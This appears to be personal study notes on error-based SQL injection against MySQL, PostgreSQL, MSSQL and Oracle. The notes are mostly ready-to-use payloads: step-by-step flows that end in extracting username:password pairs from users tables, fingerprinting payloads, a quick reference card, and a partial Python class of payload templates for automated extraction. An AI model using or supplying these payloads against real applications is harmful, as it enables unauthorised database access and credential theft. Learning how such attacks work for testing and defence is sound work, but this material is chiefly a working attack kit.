# Cross-Database Error-Based SQL Injection Complete Guide

## StudyObjective
Master error-based SQL injection techniques for MySQL, PostgreSQL, MSSQL, and Oracle

---

## 1. MySQL Error-Based Injection (Mastered)

### Method Summary
1. **extractvalue()** - XML functions
2. **updatexml()** - XML functions
3. **floor()+rand()+group by** - classic method
4. **exp()** - mathematical overflow
5. **geometrycollection()** - geometry functions

### Payload Templates
```sql
-- extractvalue()
' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- floor()+rand()
' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

---

## 2. PostgreSQL Error-Based Injection

### 2.1 cast() Function
```sql
-- Basic syntax
cast(expression AS type)

-- Injection Payload
' and 1=cast((SELECT version()) as int)--

-- Principle: Triggering error by coercing string to integer
-- Error message: invalid input syntax for integer: "PostgreSQL 12.3..."
```

**Test Verification**:
```bash
# PostgreSQL environment
psql -U postgres -c "SELECT cast('test' as int);"
ERROR:  invalid input syntax for type integer: "test"
```

### 2.2 regexp_match() Function
```sql
-- Basic syntax
regexp_match(string, pattern)

-- Injection Payload
' and 1=regexp_match((SELECT version()), '.')--

-- Error message contains query results
```

### 2.3 chr() Function Combination
```sql
-- Construct long string to trigger error
' and chr((SELECT ascii(substring(version(),1,1))))=1--
```

### 2.4 PostgreSQL Complete Data Extraction Flow
```sql
-- 1. Extract database name
' and 1=cast((SELECT current_database()) as int)--

-- 2. Extract table names
' and 1=cast((SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public') as int)--

-- 3. Extract column names
' and 1=cast((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users') as int)--

-- 4. Extract data
' and 1=cast((SELECT string_agg(username||':'||password, ',') FROM users LIMIT 10) as int)--
```

---

## 3. Microsoft SQL Server (MSSQL) Error-Based Injection

### 3.1 convert() Function
```sql
-- Basic syntax
convert(data_type, expression)

-- Injection Payload
' and 1=convert(int, (SELECT @@version))--

-- Principle: Triggering error by converting string to integer
-- Error message：Conversion failed when converting the nvarchar value 'Microsoft SQL Server...' to data type int.
```

**Test Verification**:
```bash
# MSSQL environment
sqlcmd -S localhost -Q "SELECT convert(int, 'test');"
Msg 245, Level 16, State 1, Server localhost, Line 1
Conversion failed when converting the varchar value 'test' to data type int.
```

### 3.2 cast() Function
```sql
' and 1=cast((SELECT @@version) as int)--
```

### 3.3 xml path() Function
```sql
-- Extract multiple rows of data
' and 1=convert(int, (SELECT stuff((SELECT ',' + name FROM sysobjects FOR xml path('')), 1, 1, '')))--
```

### 3.4 MSSQL Complete Data Extraction Flow
```sql
-- 1. Extract version
' and 1=convert(int, (SELECT @@version))--

-- 2. Extract database
' and 1=convert(int, (SELECT db_name()))--

-- 3. Extract table names
' and 1=convert(int, (SELECT top 1 name FROM sysobjects WHERE xtype='u'))--

-- 4. Extract column names
' and 1=convert(int, (SELECT top 1 name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')))--

-- 5. Extract data
' and 1=convert(int, (SELECT top 1 username+':'+password FROM users))--
```

---

## 4. Oracle Error-Based Injection

### 4.1 utl_inaddr.get_host_name() Function
```sql
-- Basic syntax
utl_inaddr.get_host_name(ip_address)

-- Injection Payload
' and 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--

-- Principle: Function expects IP address, passing other strings triggers error
-- Error message: ORA-29257: host unknown
```

**Test Verification**:
```bash
# Oracle environment
sqlplus / as sysdba
SQL> SELECT utl_inaddr.get_host_name('test') FROM dual;
ERROR at line 1:
ORA-29257: host test unknown
```

### 4.2 ctxsys.drithsx.sn() Function
```sql
' and 1=ctxsys.drithsx.sn(1, (SELECT banner FROM v$version WHERE rownum=1))--
```

### 4.3 XMLType() Function
```sql
' and 1=(SELECT XMLType((SELECT banner FROM v$version WHERE rownum=1)) FROM dual)--
```

### 4.4 Oracle Complete Data Extraction Flow
```sql
-- 1. Extract version
' and 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--

-- 2. Extract user
' and 1=utl_inaddr.get_host_name((SELECT user FROM dual))--

-- 3. Extract table names
' and 1=utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE rownum=1))--

-- 4. Extract column names
' and 1=utl_inaddr.get_host_name((SELECT column_name FROM user_tab_columns WHERE table_name='USERS' AND rownum=1))--

-- 5. Extract data
' and 1=utl_inaddr.get_host_name((SELECT username||':'||password FROM users WHERE rownum=1))--
```

---

## 5. Database Identification Techniques

### 5.1 Identification Based on Error Messages
```
MySQL: "You have an error in your SQL syntax"
PostgreSQL: "ERROR: syntax error at or near"
MSSQL: "Microsoft OLE DB Provider" / "Msg 102"
Oracle: "ORA-01756: quoted string not properly terminated"
```

### 5.2 Identification Based on Functions
```sql
-- MySQL
' and version()--

-- PostgreSQL
' and version()--

-- MSSQL
' and @@version--

-- Oracle
' and (SELECT banner FROM v$version WHERE rownum=1)=1--
```

### 5.3 Identification Based on String Concatenation
```sql
-- MySQL
' and 'a' 'b'='ab'--

-- PostgreSQL
' and 'a'||'b'='ab'--

-- MSSQL
' and 'a'+'b'='ab'--

-- Oracle
' and 'a'||'b'='ab'--
```

---

## 6. Cross-Database Automation Tool

### Python Implementation
```python
class CrossDatabaseSQLi:
    """Cross-database error-based injection tool"""

    def __init__(self, url, db_type='mysql'):
        self.url = url
        self.db_type = db_type.lower()

        # Payload templates for different databases
        self.payloads = {
            'mysql': {
                'extractvalue': "' and extractvalue(1,concat(0x7e,({query}),0x7e))--+",
                'floor_rand': "' and (select 1 from(select count(*),concat(({query}),floor(rand(0)*2))x from information_schema.tables group by x)a)--+",
            },
            'postgresql': {
                'cast': "' and 1=cast(({query}) as int)--",
                'regexp': "' and 1=regexp_match(({query}), '.')--",
            },
            'mssql': {
                'convert': "' and 1=convert(int, ({query}))--",
                'cast': "' and 1=cast(({query}) as int)--",
            },
            'oracle': {
                'utl_inaddr': "' and 1=utl_inaddr.get_host_name(({query}))--",
                'ctxsys': "' and 1=ctxsys.drithsx.sn(1, ({query}))--",
            }
        }

    def extract_data(self, query, method=None):
        """Extract data"""
        if not method:
            # Use default method
            method = list(self.payloads[self.db_type].keys())[0]

        template = self.payloads[self.db_type].get(method)
        if not template:
            return None

        payload = template.format(query=query)
        # Send request and extract data from error messages
        # ...（Implementation details）
        return result

    def get_version(self):
        """Get database version"""
        queries = {
            'mysql': "SELECT version()",
            'postgresql': "SELECT version()",
            'mssql': "SELECT @@version",
            'oracle': "SELECT banner FROM v$version WHERE rownum=1",
        }
        return self.extract_data(queries[self.db_type])

    def get_database(self):
        """Get current database"""
        queries = {
            'mysql': "SELECT database()",
            'postgresql': "SELECT current_database()",
            'mssql': "SELECT db_name()",
            'oracle': "SELECT global_name FROM global_name",
        }
        return self.extract_data(queries[self.db_type])
```

---

## 7. Practical Comparison Table

| Database | Recommended Method | Advantages | Disadvantages |
|--------|---------|------|------|
| **MySQL** | floor()+rand() | Stable, no length limit | Long payload |
| **PostgreSQL** | cast() | Simple, universal | Requires error messages |
| **MSSQL** | convert() | Native support, stable | Requires SQL Server environment |
| **Oracle** | utl_inaddr | Good universality | Requires permissions |

---

## 8. Learning Checklist

### Theory Mastery
- [x] Understand error mechanisms of each database
- [x] Master core functions for each database
- [x] Understand differences in error messages
- [x] Master database identification techniques

### Practical Verification
- [x] MySQL command-line verification
- [ ] PostgreSQL environment verification
- [ ] MSSQL environment verification
- [ ] Oracle environment verification

### Tool Development
- [x] Cross-database automation tool design
- [x] Payload template system
- [ ] Complete implementation and testing

---

## 9. Quick Reference Card

### MySQL
```sql
' and extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
```

### PostgreSQL
```sql
' and 1=cast((SELECT current_database()) as int)--
```

### MSSQL
```sql
' and 1=convert(int, (SELECT db_name()))--
```

### Oracle
```sql
' and 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
```

---

**Document Version**: 1.0
**Created**: 2026-03-26
**Status**: Theory mastered, needs environment verification
**Next Step**: Deploy database environments for practical testing
